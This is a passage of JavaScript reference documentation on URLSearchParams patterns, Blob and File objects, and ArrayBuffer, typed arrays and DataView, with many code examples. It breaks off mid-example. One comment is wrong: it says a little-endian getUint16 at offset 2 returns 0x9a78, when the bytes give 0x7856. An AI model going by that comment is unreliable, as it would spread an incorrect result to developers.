[Inference] URLSearchParams operations maintain insertion order, suggesting underlying implementations may use ordered data structures (arrays or linked lists) rather than hash maps. This affects performance characteristics for large parameter sets.

Repeated `get()` operations on parameter sets with many duplicate names scan linearly to find the first match. For frequent lookups, caching results or using Map-based structures may improve performance:

```javascript
// Caching first values
const cache = new Map();
for (const [key, value] of params) {
  if (!cache.has(key)) {
    cache.set(key, value);
  }
}
// Subsequent lookups use cache.get(key)
```

The `toString()` method serializes the entire parameter set, potentially expensive for large sets called repeatedly. Caching serialized strings when parameters are stable avoids redundant work:

```javascript
let cachedString = null;
function getCachedString(params) {
  if (!cachedString) {
    cachedString = params.toString();
  }
  return cachedString;
}
```

### Browser and Environment Support

URLSearchParams achieved widespread browser support by 2016, with polyfills available for older environments. The API works identically in browsers and Node.js (native support since Node.js 10).

[Unverified] Recent additions like the two-argument `delete()` and `has()` overloads may not have universal support across all environments as of late 2024.

Node.js provides URLSearchParams through the `url` module:

```javascript
const { URLSearchParams } = require('url');
// Or with ES modules
import { URLSearchParams } from 'url';
```

The browser global `URLSearchParams` and Node.js implementation maintain API compatibility, though internal implementation details may differ.

### Common Patterns and Utilities

**Filtering parameters:**

```javascript
function filterParams(params, predicate) {
  const filtered = new URLSearchParams();
  for (const [key, value] of params) {
    if (predicate(key, value)) {
      filtered.append(key, value);
    }
  }
  return filtered;
}

// Example: remove empty values
const cleaned = filterParams(params, (key, value) => value !== '');
```

**Merging parameter sets:**

```javascript
function mergeParams(...paramSets) {
  const merged = new URLSearchParams();
  for (const params of paramSets) {
    for (const [key, value] of params) {
      merged.append(key, value);
    }
  }
  return merged;
}
```

**Transforming values:**

```javascript
function mapValues(params, transform) {
  const mapped = new URLSearchParams();
  for (const [key, value] of params) {
    mapped.append(key, transform(value, key));
  }
  return mapped;
}

// Example: trim all values
const trimmed = mapValues(params, v => v.trim());
```

**Default values:**

```javascript
function withDefaults(params, defaults) {
  const result = new URLSearchParams(params);
  for (const [key, value] of Object.entries(defaults)) {
    if (!result.has(key)) {
      result.set(key, value);
    }
  }
  return result;
}
```

---

## Blob and File Objects

### Blob Interface

The Blob interface represents a blob, which is a file-like object of immutable, raw data; they can be read as text or binary data, or converted into a ReadableStream so its methods can be used for processing the data.

**Key characteristics:**

- Immutable raw data
- Blobs can represent data that isn't necessarily in a JavaScript-native format
- Can be used anywhere binary data is needed

---

### Blob Constructor

#### Syntax

```javascript
new Blob()
new Blob(blobParts)
new Blob(blobParts, options)
```

#### Parameters

##### `blobParts` (optional)

An iterable object such as an Array, having ArrayBuffers, TypedArrays, DataViews, Blobs, strings, or a mix of any of such elements, that will be put inside the Blob

**Accepted types:**

- `ArrayBuffer`
- `TypedArray` (Uint8Array, Int32Array, etc.)
- `DataView`
- `Blob` (nested blobs)
- `String` - Strings should be well-formed Unicode, and lone surrogates are sanitized using the same algorithm as String.prototype.toWellFormed()

##### `options` (optional)

**Properties:**

- **`type`** (string) - The MIME type of the data that will be stored into the blob. The default value is the empty string, ("")
    
- **`endings`** (string) - How to interpret newline characters (\n) within the contents, if the data is text. The default value, transparent, copies newline characters into the blob without changing them. To convert newlines to the host system's native convention, specify the value native
    

**Values for `endings`:**

- `"transparent"` (default) - No conversion
- `"native"` - Converts `\n` to platform-specific line endings

#### Return Value

A new Blob object containing the specified data

#### Examples

```javascript
// From string
const blob1 = new Blob(['Hello, world!'], { type: 'text/plain' });

// From JSON
const obj = { hello: 'world' };
const blob2 = new Blob([JSON.stringify(obj, null, 2)], {
  type: 'application/json'
});

// From typed array
const bytes = new Uint8Array([72, 101, 108, 108, 111]); // "Hello"
const blob3 = new Blob([bytes], { type: 'application/octet-stream' });

// From ArrayBuffer
const buffer = new ArrayBuffer(8);
const blob4 = new Blob([buffer]);

// Multiple parts
const blob5 = new Blob(
  ['<html>', '<body>Content</body>', '</html>'],
  { type: 'text/html' }
);

// Mixed types
const blob6 = new Blob(
  ['String part ', new Uint8Array([65, 66, 67]), ' more text'],
  { type: 'text/plain' }
);

// From another Blob
const blob7 = new Blob([blob1, blob2]);
```

---

### Blob Instance Properties

#### `size` (Read-only)

**Type:** Number  
The size, in bytes, of the data contained in the Blob object

```javascript
const blob = new Blob(['Hello, world!']);
console.log(blob.size); // 13
```

#### `type` (Read-only)

**Type:** String  
A string indicating the MIME type of the data contained in the Blob. If the type is unknown, this string is empty

```javascript
const blob1 = new Blob(['{}'], { type: 'application/json' });
console.log(blob1.type); // 'application/json'

const blob2 = new Blob(['data']);
console.log(blob2.type); // '' (empty string)
```

---

### Blob Instance Methods

#### `arrayBuffer()`

Returns a promise that resolves with an ArrayBuffer containing the entire contents of the Blob as binary data

**Syntax:**

```javascript
arrayBuffer()
```

**Returns:** `Promise<ArrayBuffer>`

**Example:**

```javascript
const blob = new Blob(['Hello'], { type: 'text/plain' });

blob.arrayBuffer().then(buffer => {
  const uint8 = new Uint8Array(buffer);
  console.log(uint8); // Uint8Array(5) [72, 101, 108, 108, 111]
});

// With async/await
const buffer = await blob.arrayBuffer();
const bytes = new Uint8Array(buffer);
```

#### `bytes()`

Returns a promise that resolves with a Uint8Array containing the contents of the Blob

**Syntax:**

```javascript
bytes()
```

**Returns:** `Promise<Uint8Array>`

**Example:**

```javascript
const blob = new Blob(['Hello']);
const uint8Array = await blob.bytes();
console.log(uint8Array); // Uint8Array(5) [72, 101, 108, 108, 111]
```

#### `slice()`

Returns a new Blob object containing the data in the specified range of bytes of the blob on which it's called

**Syntax:**

```javascript
slice()
slice(start)
slice(start, end)
slice(start, end, contentType)
```

**Parameters:**

- `start` (optional) - Byte offset for start of slice (default: 0). Negative values count from the end
- `end` (optional) - Byte offset for end of slice, exclusive (default: blob.size)
- `contentType` (optional) - MIME type for new blob (default: empty string)

**Returns:** New `Blob` object

**Example:**

```javascript
const blob = new Blob(['Hello, world!'], { type: 'text/plain' });

// Get first 5 bytes
const slice1 = blob.slice(0, 5);
console.log(await slice1.text()); // 'Hello'

// Get last 6 bytes
const slice2 = blob.slice(-6);
console.log(await slice2.text()); // 'world!'

// Get middle portion with new type
const slice3 = blob.slice(7, 12, 'text/html');
console.log(slice3.type); // 'text/html'
console.log(await slice3.text()); // 'world'

// Negative indices
const slice4 = blob.slice(-6, -1);
console.log(await slice4.text()); // 'world'
```

#### `stream()`

Returns a ReadableStream that can be used to read the contents of the Blob

**Syntax:**

```javascript
stream()
```

**Returns:** `ReadableStream`

**Example:**

```javascript
const blob = new Blob(['Hello, world!']);
const stream = blob.stream();
const reader = stream.getReader();

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  console.log(value); // Uint8Array chunks
}

// Using with Response
const response = new Response(blob.stream());
const text = await response.text();
```

#### `text()`

Returns a promise that resolves with a string containing the entire contents of the Blob interpreted as UTF-8 text

**Syntax:**

```javascript
text()
```

**Returns:** `Promise<string>`

**Example:**

```javascript
const blob = new Blob(['Hello, world!'], { type: 'text/plain' });
const text = await blob.text();
console.log(text); // 'Hello, world!'

// With then()
blob.text().then(text => {
  console.log(text);
});
```

---

### File Interface

The File interface provides information about files and allows JavaScript in a web page to access their content

**Inheritance:**

- A File object is a specific kind of Blob, and can be used in any context that a Blob can
- The File interface also inherits properties from the Blob interface

**How Files are obtained:**

- File objects are generally retrieved from a FileList object returned as a result of a user selecting files using the <input> element, or from a drag and drop operation's DataTransfer object

---

### File Constructor

#### Syntax

```javascript
new File(fileParts, fileName)
new File(fileParts, fileName, options)
```

#### Parameters

##### `fileParts`

An iterable of `ArrayBuffer`, `TypedArray`, `DataView`, `Blob`, or string values (same as Blob constructor)

##### `fileName`

**Type:** String  
The name of the file

##### `options` (optional)

Extends Blob options with additional properties:

- **`type`** (string) - MIME type (default: `""`)
- **`endings`** (string) - Line ending handling: `"transparent"` or `"native"`
- **`lastModified`** (number) - Timestamp in milliseconds since Unix epoch (default: `Date.now()`)

#### Return Value

A newly constructed `File` object

#### Examples

```javascript
// Basic file creation
const file1 = new File(['Hello, world!'], 'hello.txt', {
  type: 'text/plain'
});

// With lastModified
const file2 = new File(
  ['Content'],
  'document.txt',
  {
    type: 'text/plain',
    lastModified: new Date('2024-01-01').getTime()
  }
);

// From typed array
const bytes = new Uint8Array([0xFF, 0xD8, 0xFF]); // JPEG header
const file3 = new File([bytes], 'image.jpg', {
  type: 'image/jpeg'
});

// From multiple parts
const file4 = new File(
  ['<html>', '<body>Test</body>', '</html>'],
  'page.html',
  { type: 'text/html' }
);

// From Blob
const blob = new Blob(['data']);
const file5 = new File([blob], 'data.bin');
```

---

### File Instance Properties

#### Inherited from Blob

- `size` - File size in bytes
- `type` - MIME type

#### File-specific Properties

##### `name` (Read-only)

**Type:** String  
Returns the name of the file referenced by the File object

```javascript
const file = new File(['content'], 'document.txt');
console.log(file.name); // 'document.txt'

// From input element
const input = document.querySelector('input[type="file"]');
input.addEventListener('change', (e) => {
  const file = e.target.files[0];
  console.log(file.name); // e.g., 'photo.jpg'
});
```

##### `lastModified` (Read-only)

**Type:** Number  
Returns the last modified time of the file, in millisecond since the UNIX epoch (January 1st, 1970 at Midnight)

```javascript
const file = new File(['content'], 'file.txt', {
  lastModified: Date.now()
});

console.log(file.lastModified); // e.g., 1703635200000
console.log(new Date(file.lastModified)); // Converted to Date object

// From user-selected file
input.addEventListener('change', (e) => {
  const file = e.target.files[0];
  const modDate = new Date(file.lastModified);
  console.log(`Last modified: ${modDate.toLocaleDateString()}`);
});
```

##### `webkitRelativePath` (Read-only)

**Type:** String  
Returns the path the URL of the File is relative to

This property is populated when a directory is selected using an `<input>` element with the `webkitdirectory` attribute.

```javascript
// HTML: <input type="file" webkitdirectory>
input.addEventListener('change', (e) => {
  const files = Array.from(e.target.files);
  files.forEach(file => {
    console.log(file.webkitRelativePath);
    // e.g., 'myFolder/subfolder/file.txt'
  });
});
```

##### `lastModifiedDate` (Deprecated, Non-standard)

**Type:** Date  
Returns the last modified Date. Use `lastModified` instead.

---

### Common Use Cases

#### Reading File Input

```javascript
const input = document.querySelector('input[type="file"]');

input.addEventListener('change', async (e) => {
  const file = e.target.files[0];
  
  if (file) {
    console.log('Name:', file.name);
    console.log('Size:', file.size, 'bytes');
    console.log('Type:', file.type);
    console.log('Last modified:', new Date(file.lastModified));
    
    // Read as text
    const text = await file.text();
    console.log('Content:', text);
    
    // Read as ArrayBuffer
    const buffer = await file.arrayBuffer();
    
    // Read as Data URL
    const reader = new FileReader();
    reader.onload = (e) => {
      console.log('Data URL:', e.target.result);
    };
    reader.readAsDataURL(file);
  }
});
```

#### Creating Object URLs

```javascript
const file = input.files[0];
const objectURL = URL.createObjectURL(file);

// Use in image
const img = document.createElement('img');
img.src = objectURL;
document.body.appendChild(img);

// Important: Clean up when done
img.onload = () => {
  URL.revokeObjectURL(objectURL);
};
```

#### Uploading Files with fetch()

```javascript
const file = input.files[0];

// Direct file upload
await fetch('/upload', {
  method: 'POST',
  headers: {
    'Content-Type': file.type
  },
  body: file
});

// With FormData
const formData = new FormData();
formData.append('file', file);
formData.append('description', 'My file');

await fetch('/upload', {
  method: 'POST',
  body: formData
});
```

#### Drag and Drop

```javascript
const dropZone = document.getElementById('drop-zone');

dropZone.addEventListener('dragover', (e) => {
  e.preventDefault();
  dropZone.classList.add('drag-over');
});

dropZone.addEventListener('dragleave', () => {
  dropZone.classList.remove('drag-over');
});

dropZone.addEventListener('drop', async (e) => {
  e.preventDefault();
  dropZone.classList.remove('drag-over');
  
  const files = Array.from(e.dataTransfer.files);
  
  for (const file of files) {
    console.log('Dropped:', file.name);
    // Process file
  }
});
```

#### Creating Blobs from Canvas

```javascript
const canvas = document.querySelector('canvas');

// As Blob
canvas.toBlob((blob) => {
  console.log('Canvas blob:', blob.size, 'bytes');
  
  // Create File from Blob
  const file = new File([blob], 'canvas-image.png', {
    type: 'image/png'
  });
  
  // Upload or download
  const url = URL.createObjectURL(file);
  const a = document.createElement('a');
  a.href = url;
  a.download = file.name;
  a.click();
  URL.revokeObjectURL(url);
}, 'image/png');
```

#### Chunked File Reading

```javascript
async function readFileInChunks(file, chunkSize = 1024 * 1024) {
  const chunks = [];
  let offset = 0;
  
  while (offset < file.size) {
    const chunk = file.slice(offset, offset + chunkSize);
    const buffer = await chunk.arrayBuffer();
    chunks.push(buffer);
    offset += chunkSize;
    
    // Report progress
    const progress = (offset / file.size) * 100;
    console.log(`Progress: ${progress.toFixed(2)}%`);
  }
  
  return chunks;
}

// Usage
const file = input.files[0];
const chunks = await readFileInChunks(file);
```

#### Converting Between Formats

```javascript
// Blob to File
const blob = new Blob(['content'], { type: 'text/plain' });
const file = new File([blob], 'converted.txt', {
  type: blob.type,
  lastModified: Date.now()
});

// File to Blob (already a Blob, but can clone)
const fileAsBlob = file.slice(0, file.size, file.type);

// Blob to ArrayBuffer
const buffer = await blob.arrayBuffer();

// ArrayBuffer to Blob
const newBlob = new Blob([buffer], { type: 'application/octet-stream' });

// Blob to Base64
const reader = new FileReader();
reader.onload = () => {
  const base64 = reader.result; // data:...;base64,xxx
};
reader.readAsDataURL(blob);

// Base64 to Blob
function base64ToBlob(base64, type = 'application/octet-stream') {
  const byteString = atob(base64.split(',')[1]);
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  
  return new Blob([ab], { type });
}
```

---

### APIs That Accept Blob/File

In particular, the following APIs accept both Blobs and File objects:

- FileReader
- URL.createObjectURL()
- Window.createImageBitmap() and WorkerGlobalScope.createImageBitmap()
- the body option to fetch()
- XMLHttpRequest.send()

---

### TypeScript Definitions

```typescript
interface Blob {
  readonly size: number;
  readonly type: string;
  
  arrayBuffer(): Promise<ArrayBuffer>;
  bytes(): Promise<Uint8Array>;
  slice(start?: number, end?: number, contentType?: string): Blob;
  stream(): ReadableStream<Uint8Array>;
  text(): Promise<string>;
}

interface BlobConstructor {
  new(blobParts?: BlobPart[], options?: BlobPropertyBag): Blob;
}

type BlobPart = BufferSource | Blob | string;

interface BlobPropertyBag {
  type?: string;
  endings?: 'transparent' | 'native';
}

interface File extends Blob {
  readonly lastModified: number;
  readonly name: string;
  readonly webkitRelativePath: string;
}

interface FileConstructor {
  new(fileParts: BlobPart[], fileName: string, options?: FilePropertyBag): File;
}

interface FilePropertyBag extends BlobPropertyBag {
  lastModified?: number;
}

declare var Blob: BlobConstructor;
declare var File: FileConstructor;
```

---

## ArrayBuffer and Typed Arrays

### ArrayBuffer Architecture

#### Binary Data Container Fundamentals

ArrayBuffer represents a fixed-length raw binary data buffer in memory. It stores data as a contiguous sequence of bytes without interpretation or structure:

```javascript
const buffer = new ArrayBuffer(16); // Allocates 16 bytes
console.log(buffer.byteLength); // 16
```

The ArrayBuffer itself provides no direct access to its contents - it serves purely as a memory allocation. [Inference] The underlying implementation allocates a contiguous block of memory, likely aligned to system word boundaries for optimal access patterns.

ArrayBuffers are resizable in newer implementations:

```javascript
const resizableBuffer = new ArrayBuffer(16, { maxByteLength: 32 });
resizableBuffer.resize(24); // Grow to 24 bytes
console.log(resizableBuffer.byteLength); // 24
```

[Inference] Resizable buffers allocate memory up to `maxByteLength` initially or use memory management strategies that allow growth without full reallocation. Non-resizable buffers have fixed size throughout their lifetime.

#### Memory Allocation Strategies

[Inference] ArrayBuffer allocation requests memory from the JavaScript heap. Large allocations may fail if insufficient contiguous memory exists, throwing RangeError:

```javascript
try {
  const hugeBuffer = new ArrayBuffer(Number.MAX_SAFE_INTEGER);
} catch (e) {
  console.log(e instanceof RangeError); // true - allocation failed
}
```

The allocation is synchronous and immediate - memory is reserved when the constructor completes. This differs from lazy allocation strategies where memory commits only upon access.

#### Zero-Initialization Guarantee

ArrayBuffer contents initialize to zero upon creation:

```javascript
const buffer = new ArrayBuffer(8);
const view = new Uint8Array(buffer);
console.log(view[0]); // 0
console.log(view[7]); // 0
```

This zero-initialization prevents information leakage from previously used memory regions. [Inference] The implementation either allocates pre-zeroed pages from the operating system or explicitly zeros allocated memory before exposing it to JavaScript.

#### Detachment and Transfer Semantics

ArrayBuffers can detach, rendering them unusable:

```javascript
const buffer = new ArrayBuffer(16);
const transferred = buffer.transfer();

console.log(buffer.byteLength); // 0 - original is detached
console.log(transferred.byteLength); // 16 - new buffer owns the data
```

Detachment occurs when:

- Explicitly calling `transfer()` or `transferToFixedLength()`
- Transferring via `postMessage()` to workers or other contexts
- Passing to WebAssembly as transferred memory

[Inference] Detachment prevents use-after-transfer bugs by making the original buffer invalid. Attempting to create views or access detached buffers throws TypeError.

### Typed Array View Fundamentals

#### View-Buffer Relationship

Typed arrays provide structured views into ArrayBuffer memory. A single buffer can have multiple views with different interpretations:

```javascript
const buffer = new ArrayBuffer(16);

const uint8View = new Uint8Array(buffer);
const uint16View = new Uint16Array(buffer);
const uint32View = new Uint32Array(buffer);
const float64View = new Float64Array(buffer);

uint32View[0] = 0x12345678;
console.log(uint8View[0]); // 0x78 (first byte, little-endian)
console.log(uint8View[1]); // 0x56
console.log(uint8View[2]); // 0x34
console.log(uint8View[3]); // 0x12
```

Each view interprets the same underlying bytes according to its element type. Modifying through one view affects reads through all views sharing the buffer.

#### View Constructor Variations

Typed arrays construct through multiple patterns:

```javascript
// From length (creates new buffer)
const array1 = new Uint8Array(10);
console.log(array1.buffer.byteLength); // 10

// From existing buffer
const buffer = new ArrayBuffer(16);
const array2 = new Uint8Array(buffer);

// From buffer with offset
const array3 = new Uint8Array(buffer, 4); // Start at byte 4

// From buffer with offset and length
const array4 = new Uint8Array(buffer, 4, 8); // 8 bytes starting at byte 4

// From iterable
const array5 = new Uint8Array([1, 2, 3, 4]);

// From another typed array
const array6 = new Uint8Array(array5);
```

[Inference] Creating from length allocates a new ArrayBuffer sized to fit the requested elements. Creating from iterables or other typed arrays copies data into a new buffer. Creating from existing buffers shares the underlying memory.

#### Offset and Length Constraints

Views must align to element boundaries and stay within buffer bounds:

```javascript
const buffer = new ArrayBuffer(16);

// Valid - aligned to 4-byte boundaries
const uint32View = new Uint32Array(buffer, 4, 2); // 2 elements at offset 4

// Invalid - offset not aligned to element size
try {
  const badView = new Uint32Array(buffer, 3); // Offset 3 not multiple of 4
} catch (e) {
  console.log(e instanceof RangeError); // true
}

// Invalid - extends beyond buffer
try {
  const badView = new Uint32Array(buffer, 12, 2); // Would need 8 bytes, only 4 available
} catch (e) {
  console.log(e instanceof RangeError); // true
}
```

[Inference] Alignment requirements exist because most CPU architectures require or significantly benefit from aligned memory access. Unaligned access may cause hardware exceptions or severe performance penalties.

### Typed Array Type System

#### Integer Type Variants

**Uint8Array** - 8-bit unsigned integers (0 to 255):

```javascript
const uint8 = new Uint8Array([0, 128, 255]);
uint8[0] = 300; // Wraps to 44 (300 % 256)
console.log(uint8[0]); // 44
```

**Int8Array** - 8-bit signed integers (-128 to 127):

```javascript
const int8 = new Int8Array([0, 127, -128]);
int8[0] = 200; // Wraps to -56
console.log(int8[0]); // -56
```

**Uint16Array** - 16-bit unsigned integers (0 to 65535):

```javascript
const uint16 = new Uint16Array([0, 32768, 65535]);
console.log(uint16.BYTES_PER_ELEMENT); // 2
```

**Int16Array** - 16-bit signed integers (-32768 to 32767):

```javascript
const int16 = new Int16Array([-32768, 0, 32767]);
```

**Uint32Array** - 32-bit unsigned integers (0 to 4294967295):

```javascript
const uint32 = new Uint32Array([0, 2147483648, 4294967295]);
```

**Int32Array** - 32-bit signed integers (-2147483648 to 2147483647):

```javascript
const int32 = new Int32Array([-2147483648, 0, 2147483647]);
```

**BigUint64Array** - 64-bit unsigned integers (0n to 2^64-1):

```javascript
const bigUint64 = new BigUint64Array([0n, 18446744073709551615n]);
bigUint64[0] = 100n; // Must use BigInt literals
```

**BigInt64Array** - 64-bit signed integers (-2^63 to 2^63-1):

```javascript
const bigInt64 = new BigInt64Array([-9223372036854775808n, 9223372036854775807n]);
```

#### Floating Point Type Variants

**Float32Array** - 32-bit IEEE 754 floating point:

```javascript
const float32 = new Float32Array([1.5, -3.14, Infinity, NaN]);
console.log(float32.BYTES_PER_ELEMENT); // 4

// Precision loss compared to 64-bit
float32[0] = 0.1 + 0.2;
console.log(float32[0]); // Approximately 0.30000001192092896
```

[Inference] Float32 represents numbers with approximately 7 decimal digits of precision. Values outside the representable range round to ±Infinity. Very small values round to zero.

**Float64Array** - 64-bit IEEE 754 floating point:

```javascript
const float64 = new Float64Array([1.5, -3.14, Number.MAX_VALUE, Number.MIN_VALUE]);
console.log(float64.BYTES_PER_ELEMENT); // 8

float64[0] = 0.1 + 0.2;
console.log(float64[0]); // 0.30000000000000004 (standard floating point imprecision)
```

Float64 provides approximately 16 decimal digits of precision, matching JavaScript's standard Number type.

#### Specialized Type Variants

**Uint8ClampedArray** - 8-bit unsigned with clamping instead of wrapping:

```javascript
const clamped = new Uint8ClampedArray([0, 128, 255]);

clamped[0] = 300; // Clamps to 255 instead of wrapping
console.log(clamped[0]); // 255

clamped[1] = -50; // Clamps to 0
console.log(clamped[1]); // 0

clamped[2] = 127.8; // Rounds using special rounding rules
console.log(clamped[2]); // 128
```

[Inference] Uint8ClampedArray uses specific rounding rules for fractional values: 0.5 rounds to nearest even number. This type primarily serves canvas image data manipulation where clamping prevents color value overflow artifacts.

### Endianness and Byte Order

#### Platform Endianness Impact

Typed arrays use platform-native byte order (endianness). Most modern systems use little-endian:

```javascript
const buffer = new ArrayBuffer(4);
const uint32View = new Uint32Array(buffer);
const uint8View = new Uint8Array(buffer);

uint32View[0] = 0x12345678;

// Little-endian platform (most common)
console.log(uint8View[0].toString(16)); // 78
console.log(uint8View[1].toString(16)); // 56
console.log(uint8View[2].toString(16)); // 34
console.log(uint8View[3].toString(16)); // 12

// Big-endian platform (rare)
// Would show: 12, 34, 56, 78
```

[Inference] JavaScript engines detect platform endianness at runtime or compile time, configuring typed array operations accordingly. Application code typically shouldn't depend on specific endianness unless interfacing with external systems.

#### DataView for Explicit Endianness Control

DataView provides methods with explicit endianness parameters:

```javascript
const buffer = new ArrayBuffer(8);
const dataView = new DataView(buffer);

// Write as little-endian
dataView.setUint32(0, 0x12345678, true);

// Write as big-endian
dataView.setUint32(4, 0x12345678, false);

const uint8View = new Uint8Array(buffer);
console.log([...uint8View].map(b => b.toString(16)));
// Little-endian bytes at 0-3: 78, 56, 34, 12
// Big-endian bytes at 4-7: 12, 34, 56, 78
```

This enables portable binary format handling where byte order must match external specifications.

### Element Access and Manipulation

#### Index-Based Access

Typed arrays support bracket notation for element access:

```javascript
const array = new Uint16Array([100, 200, 300]);

console.log(array[0]); // 100
console.log(array[1]); // 200

array[0] = 500;
console.log(array[0]); // 500

array[10] = 42; // Out of bounds - no effect
console.log(array[10]); // undefined
console.log(array.length); // Still 3
```

Out-of-bounds access returns undefined for reads and has no effect for writes, unlike regular arrays which grow dynamically.

#### Subarray Views

The `subarray()` method creates a new typed array view referencing the same buffer:

```javascript
const array = new Uint8Array([0, 1, 2, 3, 4, 5, 6, 7]);
const sub = array.subarray(2, 6); // Elements at indices 2-5

console.log(sub.length); // 4
console.log(sub[0]); // 2 (array[2])

sub[0] = 100;
console.log(array[2]); // 100 - shared underlying buffer

console.log(sub.byteOffset); // 2 - offset into original buffer
```

Subarray creates a new view without copying data. Modifications through the subarray affect the original array and vice versa.

#### Slice Creates Independent Copy

The `slice()` method copies elements into a new typed array with its own buffer:

```javascript
const array = new Uint8Array([0, 1, 2, 3, 4, 5]);
const sliced = array.slice(2, 5); // Copies elements 2-4

console.log(sliced.length); // 3
console.log(sliced[0]); // 2

sliced[0] = 100;
console.log(array[2]); // 2 - independent buffers
console.log(sliced[0]); // 100
```

[Inference] Slice allocates a new ArrayBuffer sized to fit the selected elements, then copies data. This operation has O(n) time and space complexity relative to slice length.

### Data Copying and Transfer

#### Set Method for Bulk Copying

The `set()` method copies elements from an array or typed array:

```javascript
const target = new Uint8Array(10);
const source = new Uint8Array([1, 2, 3, 4]);

target.set(source, 2); // Copy source to target starting at index 2

console.log([...target]); // [0, 0, 1, 2, 3, 4, 0, 0, 0, 0]

// Copy from regular array
target.set([10, 11, 12], 0);
console.log([...target]); // [10, 11, 12, 2, 3, 4, 0, 0, 0, 0]
```

[Inference] When copying between typed arrays of the same type, implementations may use optimized memory copy operations (memcpy). Cross-type copying requires element-by-element conversion and assignment.

Bounds checking occurs - attempting to copy beyond target length throws RangeError:

```javascript
const target = new Uint8Array(5);
const source = new Uint8Array([1, 2, 3, 4, 5, 6]);

try {
  target.set(source, 1); // Would need 6 slots, only 4 available from offset 1
} catch (e) {
  console.log(e instanceof RangeError); // true
}
```

#### CopyWithin for In-Place Movement

The `copyWithin()` method moves elements within the same typed array:

```javascript
const array = new Uint8Array([0, 1, 2, 3, 4, 5, 6, 7]);

// Copy elements 3-5 to position 0
array.copyWithin(0, 3, 6);

console.log([...array]); // [3, 4, 5, 3, 4, 5, 6, 7]
```

[Inference] CopyWithin handles overlapping regions correctly, using a temporary buffer or bidirectional copy strategy to ensure correct behavior when source and destination overlap.

#### Fill for Uniform Initialization

The `fill()` method sets all or a range of elements to a value:

```javascript
const array = new Uint8Array(10);

array.fill(255); // Fill entire array
console.log([...array]); // [255, 255, 255, ...]

array.fill(0, 2, 5); // Fill indices 2-4 with 0
console.log([...array]); // [255, 255, 0, 0, 0, 255, 255, ...]
```

[Inference] Fill likely uses optimized loops or SIMD operations for performance, especially for large arrays or simple patterns.

### Iteration and Array Methods

#### Standard Array Method Support

Typed arrays implement most Array.prototype methods:

```javascript
const array = new Uint8Array([1, 2, 3, 4, 5]);

// Map
const doubled = array.map(x => x * 2);
console.log(doubled); // Uint8Array [2, 4, 6, 8, 10]

// Filter
const evens = array.filter(x => x % 2 === 0);
console.log(evens); // Uint8Array [2, 4]

// Reduce
const sum = array.reduce((acc, val) => acc + val, 0);
console.log(sum); // 15

// ForEach
array.forEach((val, idx) => {
  console.log(`${idx}: ${val}`);
});

// Find
const found = array.find(x => x > 3);
console.log(found); // 4

// Some/Every
console.log(array.some(x => x > 4)); // true
console.log(array.every(x => x > 0)); // true
```

[Inference] Methods that return arrays (map, filter, slice) return new typed arrays of the same type, not regular arrays. This preserves type information through transformations.

#### Iteration Protocol Implementation

Typed arrays implement iterable protocol:

```javascript
const array = new Uint8Array([10, 20, 30]);

// For-of loop
for (const value of array) {
  console.log(value); // 10, 20, 30
}

// Spread operator
const regular = [...array];
console.log(regular); // [10, 20, 30] - regular array

// Array.from
const copy = Array.from(array);

// Destructuring
const [first, second] = array;
console.log(first, second); // 10, 20
```

Iterator methods provide value, key, and entry iteration:

```javascript
// Values (default iterator)
for (const val of array.values()) {
  console.log(val);
}

// Keys
for (const idx of array.keys()) {
  console.log(idx); // 0, 1, 2
}

// Entries
for (const [idx, val] of array.entries()) {
  console.log(`${idx}: ${val}`);
}
```

#### Sorting with Type Awareness

The `sort()` method sorts in place using numeric comparison:

```javascript
const array = new Uint8Array([5, 2, 8, 1, 9]);

array.sort();
console.log([...array]); // [1, 2, 5, 8, 9]

// Custom comparator
array.sort((a, b) => b - a); // Descending
console.log([...array]); // [9, 8, 5, 2, 1]
```

[Inference] Unlike Array.sort() which converts elements to strings by default, typed array sort() uses numeric comparison. This prevents the ["10", "2"] ordering problem that occurs with string comparison.

### DataView for Mixed-Type Access

#### DataView Construction and Properties

DataView provides flexible, alignment-independent access to buffer contents:

```javascript
const buffer = new ArrayBuffer(16);
const view = new DataView(buffer);

console.log(view.buffer === buffer); // true
console.log(view.byteLength); // 16
console.log(view.byteOffset); // 0

// DataView on buffer slice
const partialView = new DataView(buffer, 4, 8); // 8 bytes starting at offset 4
console.log(partialView.byteLength); // 8
console.log(partialView.byteOffset); // 4
```

DataView doesn't have element indexing - all access occurs through getter/setter methods with explicit byte offsets.

#### Getter Methods with Endianness Control

DataView provides getters for all numeric types:

```javascript
const buffer = new ArrayBuffer(16);
const view = new DataView(buffer);

// Set some data first (using typed array for convenience)
const uint8 = new Uint8Array(buffer);
uint8.set([0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0]);

// Read as 32-bit integer, little-endian
const le = view.getUint32(0, true);
console.log(le.toString(16)); // 0x78563412

// Read same bytes as big-endian
const be = view.getUint32(0, false);
console.log(be.toString(16)); // 0x12345678

// Read as 16-bit integer at offset 2
const u16 = view.getUint16(2, true);
console.log(u16.toString(16)); // 0x9a78

// Read as float
view.setFloat32(8, 3.14159, true);
const f32 = view.getFloat32(8, true);
console.log(f32); // ~3.14159
```

Available getters:

- `getInt8(byteOffset)` - signed 8-bit
- `getUint8(byteOffset)` - unsigned 8-bit
- `getInt16(byteOffset, littleEndian)` - signed 16-bit
- `getUint16(byteOffset, littleEndian)` - unsigned 16-bit
- `getInt32(byteOffset, littleEndian)` - signed 32-bit
- `getUint32(byteOffset, littleEndian)` - unsigned 32-bit
- `getBigInt64(byteOffset, littleEndian)` - signed 64-bit BigInt
- `getBigUint64(byteOffset, littleEndian)` - unsigned 64-bit BigInt
- `getFloat32(byteOffset, littleEndian)` - 32-bit float
- `getFloat64(byteOffset, littleEndian)` - 64-bit float

The `littleEndian` parameter defaults to false (big-endian) when omitted.

#### Setter Methods for Mixed-Type Writing

Corresponding setters write values at specified offsets:

```javascript
const buffer = new ArrayBuffer(16);
const view = new DataView(buffer);

// Write different types at different offsets
view.setUint8(0, 255);
view.setInt16(1, -1000, true); // Little-endian
view.setUint32(3, 0xDEADBEEF, false); // Big-endian
view.setFloat64(7, 3.141592653589793, true);

// Read back with Uint8Array to see bytes
const bytes = new Uint8Array(buffer);
console.log([...bytes].map(b => b.toString(16).padStart(2, '0')));
```

Setters allow unaligned access, which typed arrays cannot support:

```javascript
const buffer = new ArrayBuffer(10);
const view = new DataView(buffer);

// Write 32-bit value at odd offset
